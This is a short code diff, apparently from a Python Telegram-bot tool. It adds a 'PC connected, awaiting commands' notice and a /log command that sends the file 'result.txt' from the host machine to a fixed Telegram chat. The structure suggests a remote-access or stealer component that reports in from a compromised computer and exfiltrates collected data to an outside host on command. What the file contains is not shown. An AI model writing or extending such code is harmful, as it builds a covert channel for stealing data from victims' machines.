@@ -11,5 +11,14 @@ def send_file(file_path):
  with open(file_path, 'rb') as f:
   bot.send_document(chat_id=chat_id, document=f)
 
-# Отправляем файл
+# Отправляем файл и сообщение
 send_file('result.txt')
+bot.send_message(chat_id=chat_id, text="ПОДЛЮЧЕН ПК\nОжидаю команды...")
+
+# Обработчик команды /log
+@bot.message_handler(commands=['log'])
+def handle_log(message):
+ send_file('result.txt')
+
+# Запускаем бота
+bot.polling()
